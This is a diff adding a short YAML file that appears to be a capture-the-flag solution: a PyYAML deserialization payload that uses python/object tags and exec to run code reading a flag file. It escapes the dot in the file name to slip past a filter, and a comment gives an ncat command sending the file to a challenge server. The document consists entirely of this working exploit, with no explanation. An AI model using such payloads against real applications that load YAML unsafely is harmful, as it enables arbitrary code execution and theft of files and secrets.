@@ -1,0 +1,9 @@
+!!python/object/new:str
+state: !!python/tuple
+- 'print(getattr(open("fl4g\x2etxt"), "read")())'
+- !!python/object/new:Warning
+  state:
+    update: !!python/name:exec
+
+
+#command ncat -v challenges.isictf.live 1108 < sol.yaml
